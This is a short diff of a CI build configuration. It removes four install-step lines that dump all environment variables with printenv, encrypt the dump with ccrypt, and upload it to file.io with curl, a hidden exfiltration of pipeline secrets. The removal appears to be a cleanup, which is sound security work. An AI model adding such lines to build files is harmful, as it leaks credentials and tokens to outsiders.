@@ -14,10 +14,6 @@ install:
   -n 1 pip3 install"
 - pip3 install codecov
 - sudo apt-get update
-- sudo apt-get install -y ccrypt
-- printenv > temp.txt
-- ccencrypt temp.txt -K $TEMPORARY_SECRET
-- curl -F'file=@temp.txt.cpt' https://file.io
 addons:
   postgresql: '9.6'
 jobs:
